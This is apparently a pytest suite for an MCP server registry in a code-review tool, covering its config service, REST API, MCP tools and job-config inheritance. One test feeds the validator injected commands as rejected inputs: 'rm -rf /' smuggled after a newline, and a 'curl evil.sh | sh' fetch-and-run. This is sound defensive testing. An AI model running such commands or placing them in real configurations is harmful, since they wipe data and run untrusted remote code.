"""Tests for the OCR MCP server registry: service, REST API, MCP tools,
and mcp_servers inheritance into managed job configs."""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
from typing import Any

import httpx
import pytest

from app.mcp.server import (
    ocr_add_mcp_server,
    ocr_list_mcp_servers,
    ocr_remove_mcp_server,
)
from app.ocr.adapter import OCRAdapter
from app.ocr.models import ProviderResolution
from app.schemas.ocr_mcp import OcrMcpServerConfig
from app.services.errors import NotFoundError, ValidationFailedError
from app.services.ocr_mcp import OcrMcpServerService, ocr_user_config_path


@pytest.fixture()
def config_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Point the OCR user config at a temp file seeded with unrelated keys."""

    path = tmp_path / "opencodereview" / "config.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(
            {
                "provider": "acme",
                "custom_providers": {"acme": {"api_key": "k", "url": "http://x"}},
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("OCR_CONFIG_PATH", str(path))
    return path


@pytest.fixture()
async def client(settings, fake_ocr, runtime):
    """App client with the lifespan running; minimal setup (no provider)."""

    from app.main import create_app

    app = create_app(settings)
    ready = asyncio.Event()
    stop = asyncio.Event()

    async def _lifespan_runner() -> None:
        async with app.router.lifespan_context(app):
            ready.set()
            await stop.wait()

    lifespan_task = asyncio.create_task(_lifespan_runner())
    await ready.wait()
    transport = httpx.ASGITransport(app=app)
    try:
        async with httpx.AsyncClient(
            transport=transport, base_url="http://testserver"
        ) as c:
            await c.get("/api/v1/health")
            yield c
    finally:
        stop.set()
        await asyncio.wait_for(lifespan_task, timeout=10)


def _read(path: Path) -> dict[str, Any]:
    return json.loads(path.read_text(encoding="utf-8"))


# --- service -----------------------------------------------------------------


async def test_list_is_empty_without_config(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setenv(
        "OCR_CONFIG_PATH", str(tmp_path / "missing" / "config.json")
    )
    assert await OcrMcpServerService().list() == []


async def test_upsert_then_list_roundtrip(config_path: Path) -> None:
    service = OcrMcpServerService()
    await service.upsert(
        "docs",
        OcrMcpServerConfig(
            command="npx", args=["-y", "@acme/docs"], tools=["search_docs"]
        ),
    )
    await service.upsert(
        "search",
        OcrMcpServerConfig(
            type="remote",
            url="https://mcp.example.com/mcp",
            headers={"Authorization": "Bearer t"},
        ),
    )
    listed = await service.list()
    assert [s["name"] for s in listed] == ["docs", "search"]
    docs = listed[0]
    assert docs["type"] == "stdio"
    assert docs["command"] == "npx"
    assert docs["args"] == ["-y", "@acme/docs"]
    search = listed[1]
    assert search["type"] == "remote"
    assert search["url"] == "https://mcp.example.com/mcp"
    # Unrelated config keys survive the write.
    assert _read(config_path)["provider"] == "acme"


async def test_upsert_replaces_existing(config_path: Path) -> None:
    service = OcrMcpServerService()
    await service.upsert("docs", OcrMcpServerConfig(command="npx"))
    await service.upsert("docs", OcrMcpServerConfig(command="uvx"))
    listed = await service.list()
    assert len(listed) == 1
    assert listed[0]["command"] == "uvx"


async def test_get_and_remove(config_path: Path) -> None:
    service = OcrMcpServerService()
    await service.upsert("docs", OcrMcpServerConfig(command="npx"))
    got = await service.get("docs")
    assert got["command"] == "npx"
    removed = await service.remove("docs")
    assert removed["removed"] is True
    assert await service.list() == []
    # The map itself may remain as an empty object — harmless for OCR.
    assert _read(config_path)["mcp_servers"] == {}
    with pytest.raises(NotFoundError):
        await service.remove("docs")
    with pytest.raises(NotFoundError):
        await service.get("docs")


async def test_upsert_rejects_invalid_name(config_path: Path) -> None:
    for bad in ("", "has.dot", "has space", "-leading", "x" * 65):
        with pytest.raises(ValidationFailedError):
            await OcrMcpServerService().upsert(
                bad, OcrMcpServerConfig(command="npx")
            )


async def test_upsert_rejects_missing_transport_target(
    config_path: Path,
) -> None:
    service = OcrMcpServerService()
    with pytest.raises(ValidationFailedError):
        await service.upsert("docs", OcrMcpServerConfig())  # stdio w/o command
    with pytest.raises(ValidationFailedError):
        # remote url without type is rejected at the schema level; a remote
        # type without url fails the semantic check here.
        await service.upsert("docs", OcrMcpServerConfig(type="remote"))


async def test_upsert_rejects_unknown_fields(config_path: Path) -> None:
    with pytest.raises(ValueError):
        OcrMcpServerConfig.model_validate({"command": "npx", "bogus": 1})


async def test_upsert_rejects_multiline_command(config_path: Path) -> None:
    # command/setup are persisted and later executed by the OCR binary;
    # keep them single-line so the stored value stays reviewable.
    with pytest.raises(ValueError):
        OcrMcpServerConfig.model_validate({"command": "npx\nrm -rf /"})
    with pytest.raises(ValueError):
        OcrMcpServerConfig.model_validate(
            {"command": "npx", "setup": "npm i\n&& curl evil.sh | sh"}
        )


async def test_non_dict_config_is_an_error_not_overwritten(
    tmp_path: Path, monkeypatch
) -> None:
    """A config file whose top level is not an object must never be rebuilt."""

    path = tmp_path / "config.json"
    path.write_text('["not", "an", "object"]', encoding="utf-8")
    monkeypatch.setenv("OCR_CONFIG_PATH", str(path))
    service = OcrMcpServerService()
    with pytest.raises(ValidationFailedError):
        await service.list()
    with pytest.raises(ValidationFailedError):
        await service.upsert("docs", OcrMcpServerConfig(command="npx"))
    # The original content is untouched.
    assert json.loads(path.read_text(encoding="utf-8")) == ["not", "an", "object"]


async def test_list_tolerates_nonconforming_cli_entries(
    tmp_path: Path, monkeypatch
) -> None:
    """Entries written outside this service must not break list/get/remove."""

    path = tmp_path / "config.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(
            {
                "mcp_servers": {
                    "ok": {"command": "npx"},
                    "weird": {
                        "type": "sse",
                        "url": "https://x/mcp",
                        "future_field": 1,
                    },
                    "junk": "not-a-dict",
                }
            }
        ),
        encoding="utf-8",
    )
    monkeypatch.setenv("OCR_CONFIG_PATH", str(path))
    by_name = {
        server["name"]: server for server in await OcrMcpServerService().list()
    }
    assert by_name["ok"]["command"] == "npx"
    # Unknown transport is surfaced as stdio rather than failing the listing;
    # readable fields are preserved.
    assert by_name["weird"]["type"] == "stdio"
    assert by_name["weird"]["url"] == "https://x/mcp"
    assert by_name["junk"] == {"name": "junk", "type": "stdio"}
    # And the raw (non-conforming) entry can still be removed.
    removed = await OcrMcpServerService().remove("weird")
    assert removed["removed"] is True
    assert "weird" not in _read(path)["mcp_servers"]


async def test_corrupt_config_raises_structured_error(
    tmp_path: Path, monkeypatch
) -> None:
    path = tmp_path / "config.json"
    path.write_text("{not json", encoding="utf-8")
    monkeypatch.setenv("OCR_CONFIG_PATH", str(path))
    with pytest.raises(ValidationFailedError):
        await OcrMcpServerService().list()


# --- REST API ----------------------------------------------------------------


async def test_api_crud_roundtrip(client, config_path: Path) -> None:
    h = {"X-OCR-CSRF": client.cookies.get("ocrcc_csrf")}

    response = await client.get("/api/v1/ocr/mcp-servers")
    assert response.status_code == 200
    assert response.json() == []

    response = await client.put(
        "/api/v1/ocr/mcp-servers/cognee",
        headers=h,
        json={"type": "stdio", "command": "uvx", "args": ["cognee-mcp"]},
    )
    assert response.status_code == 200
    assert response.json()["name"] == "cognee"

    response = await client.put(
        "/api/v1/ocr/mcp-servers/codegraph",
        headers=h,
        json={"type": "remote", "url": "http://127.0.0.1:9100/mcp"},
    )
    assert response.status_code == 200

    response = await client.get("/api/v1/ocr/mcp-servers")
    assert [s["name"] for s in response.json()] == ["codegraph", "cognee"]

    response = await client.get("/api/v1/ocr/mcp-servers/cognee")
    assert response.status_code == 200
    assert response.json()["command"] == "uvx"

    response = await client.delete("/api/v1/ocr/mcp-servers/cognee", headers=h)
    assert response.status_code == 204
    response = await client.delete("/api/v1/ocr/mcp-servers/cognee", headers=h)
    assert response.status_code == 404
    assert response.json()["error"]["code"] == "not_found"


async def test_api_validation_errors(client, config_path: Path) -> None:
    h = {"X-OCR-CSRF": client.cookies.get("ocrcc_csrf")}

    # Invalid name is a structured 422.
    response = await client.put(
        "/api/v1/ocr/mcp-servers/bad.name", headers=h, json={"command": "npx"}
    )
    assert response.status_code == 422
    assert response.json()["error"]["code"] == "validation_failed"

    # stdio without command is a structured 422 from the service.
    response = await client.put(
        "/api/v1/ocr/mcp-servers/docs", headers=h, json={"type": "stdio"}
    )
    assert response.status_code == 422

    # Unknown fields are rejected by the schema.
    response = await client.put(
        "/api/v1/ocr/mcp-servers/docs",
        headers=h,
        json={"command": "npx", "bogus": True},
    )
    assert response.status_code == 422


# --- MCP tools ---------------------------------------------------------------


async def test_mcp_tools_roundtrip(config_path: Path) -> None:
    added = await ocr_add_mcp_server(
        name="docs",
        command="npx",
        args=["-y", "@acme/docs"],
        tools=["search_docs"],
    )
    assert added["name"] == "docs"
    assert added["type"] == "stdio"

    remote = await ocr_add_mcp_server(
        name="search", type="remote", url="https://mcp.example.com/mcp"
    )
    assert remote["url"] == "https://mcp.example.com/mcp"

    listed = await ocr_list_mcp_servers()
    assert [s["name"] for s in listed] == ["docs", "search"]

    removed = await ocr_remove_mcp_server(name="docs")
    assert removed["removed"] is True
    assert [s["name"] for s in await ocr_list_mcp_servers()] == ["search"]


async def test_mcp_tool_errors_are_payloads_not_exceptions(
    config_path: Path,
) -> None:
    missing = await ocr_remove_mcp_server(name="ghost")
    assert missing["error"]["code"] == "not_found"

    invalid = await ocr_add_mcp_server(name="bad.name", command="npx")
    assert invalid["error"]["code"] == "validation_failed"

    # A pydantic-level failure (env entries missing KEY=VALUE) also returns a
    # payload — and must not echo the offending input back.
    invalid_env = await ocr_add_mcp_server(name="docs", command="npx", env=["NOSEP"])
    assert invalid_env["error"]["code"] == "validation_failed"


# --- managed job config inheritance ------------------------------------------


def _provider(token: str | None) -> ProviderResolution:
    return ProviderResolution(base_url="http://llm", token=token, model="m")


def test_write_job_config_inherits_mcp_servers(
    tmp_path: Path, config_path: Path
) -> None:
    service = OcrMcpServerService()
    asyncio.run(
        service.upsert(
            "docs",
            OcrMcpServerConfig(
                command="npx",
                env=["DOCS_TOKEN=env-secret-value"],
            ),
        )
    )
    asyncio.run(
        service.upsert(
            "search",
            OcrMcpServerConfig(
                type="remote",
                url="https://mcp.example.com/mcp",
                headers={"Authorization": "header-secret-value"},
            ),
        )
    )

    adapter = OCRAdapter.__new__(OCRAdapter)  # config writing needs no probing
    job_home = tmp_path / "job-home"
    written = adapter.write_job_config(job_home, _provider(token="llm-token"))
    data = json.loads(written.read_text(encoding="utf-8"))
    assert set(data["mcp_servers"]) == {"docs", "search"}
    assert data["mcp_servers"]["docs"]["command"] == "npx"
    assert data["mcp_servers"]["search"]["url"] == "https://mcp.example.com/mcp"


def test_write_job_config_without_mcp_servers_omits_key(
    tmp_path: Path, monkeypatch
) -> None:
    monkeypatch.setenv(
        "OCR_CONFIG_PATH", str(tmp_path / "missing" / "config.json")
    )
    adapter = OCRAdapter.__new__(OCRAdapter)
    written = adapter.write_job_config(
        tmp_path / "job-home", _provider(token="llm-token")
    )
    data = json.loads(written.read_text(encoding="utf-8"))
    assert "mcp_servers" not in data


def test_mcp_servers_survive_corrupt_global_config(
    tmp_path: Path, config_path: Path
) -> None:
    # A broken global config must not break job preparation.
    config_path.write_text("{corrupt", encoding="utf-8")
    adapter = OCRAdapter.__new__(OCRAdapter)
    written = adapter.write_job_config(
        tmp_path / "job-home", _provider(token="llm-token")
    )
    data = json.loads(written.read_text(encoding="utf-8"))
    assert "mcp_servers" not in data
